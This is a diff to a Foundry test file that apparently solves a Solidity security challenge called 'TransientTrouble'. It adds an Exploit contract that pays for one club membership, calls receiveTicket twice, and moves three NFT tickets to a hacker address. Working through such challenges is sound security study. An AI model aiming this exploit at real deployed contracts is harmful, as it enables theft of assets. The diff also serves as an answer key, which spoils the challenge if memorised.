@@ -6,6 +6,25 @@ import { TransientTroubleHelper } from "../test_helper/8_TransientTroubleSetup.s
 import "forge-std/Test.sol";
 import "../mocks/NFT.sol";
 
+contract Exploit {
+    ExclusiveClub daClub;
+    NFT ticket;
+
+    constructor(ExclusiveClub _daClub, NFT _ticket) payable {
+        daClub = _daClub;
+        ticket = _ticket;
+    }
+
+    function exploit() external {
+        daClub.externalJoinClub{value: 0.1 ether}();
+        daClub.receiveTicket();
+        daClub.receiveTicket();
+
+        ticket.transferFrom(address(this), address(0xBAD), 0);
+        ticket.transferFrom(address(this), address(0xBAD), 1);
+        ticket.transferFrom(address(this), address(0xBAD), 2);
+    }
+}
 
 contract TransientTrouble is Test {
 
@@ -25,6 +44,8 @@ contract TransientTrouble is Test {
         address hacker = address(0xBAD);
 
         vm.startPrank(hacker);
+        Exploit e = new Exploit{value: 0.1 ether}(daClub, ticket);
+        e.exploit();
         
         vm.stopPrank();
 
